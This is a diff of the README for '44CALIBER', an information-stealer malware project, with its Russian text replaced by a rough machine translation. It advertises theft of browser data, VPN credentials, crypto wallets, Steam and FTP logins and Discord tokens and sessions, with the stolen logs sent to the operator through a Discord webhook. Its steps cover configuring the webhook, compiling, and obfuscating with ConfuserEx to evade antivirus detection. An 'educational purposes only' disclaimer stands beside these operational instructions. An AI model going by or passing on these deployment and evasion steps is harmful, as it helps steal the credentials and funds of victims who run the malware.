@@ -1,27 +1,28 @@
-Стиллер с отправкой логов в дискорд бот при помощи Discord Webhook API.
+Styler with sending logs to a discord bot using the Discord Webhook API.
 
-:closed_lock_with_key: Поддержка Chrome v80+, Firefox v75+, стилит впн, криптокошельки, ваймворлд, стим, фтп, достает BSSID, токен и сессия дискорд, и т.д.
+: closed_lock_with_key: Support for Chrome v80 +, Firefox v75 +, stylize vpn, crypto wallets, wimworld, steam, ftp, get BSSID, token and session discord, etc.
 
 ![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/1.png)
 
-:exclamation: Написан исключительно в образовательных целях! Я не несу ответственности за использование данного проекта и любых его частей кода.
+: exclamation: Written for educational purposes only! I am not responsible for the use of this project and any part of its code.
+
 
 ---
 
-1) Создать Discord Webhook в разделе интеграций в чате дискорда, в который будут приходить логи.
+1) Create a Discord Webhook in the integrations section of the discord chat where logs will be sent.
 
 ![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/2.png)
 
-2) В сурсе Resources->Discord->DiscordWebhook.cs поменять данные на свои:
+2) In the Resources-> Discord-> DiscordWebhook.cs resource, change the data to your own:
 
 ![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/3.png)
 
-ВАЖНО :exclamation:
-Не создавайте бота с русскими символами, иначе логи приходить не будут.
+IMPORTANT: exclamation:
+Do not create a bot with Russian symbols, otherwise the logs will not come.
 
-3) Скомпилить.
+3) Compile.
 
-На выходе файл на антискане будет ~7/26. Юзай криптор ConfuserEx для 1/26.
+The output file on anti-scan will be ~ 7/26. Yuzai cryptor ConfuserEx for 1/26.
 
 ![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/4.png)
 
